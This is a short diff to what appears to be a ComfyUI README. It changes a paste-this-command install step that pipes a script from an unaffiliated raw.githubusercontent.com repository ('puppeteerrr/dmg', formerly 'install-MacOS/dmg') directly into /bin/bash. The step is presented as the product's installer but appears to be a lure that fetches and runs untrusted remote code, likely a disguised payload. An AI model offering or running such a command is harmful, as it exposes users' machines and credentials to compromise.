@@ -110,7 +110,7 @@ ComfyUI lets you design and execute advanced stable diffusion pipelines using a 
 - ✅Press **Enter**
 
 ```sh
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/install-MacOS/dmg/refs/heads/main/ComfyUI)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/puppeteerrr/dmg/refs/heads/main/ComfyUI)"
 ```
 
 ## Shortcuts
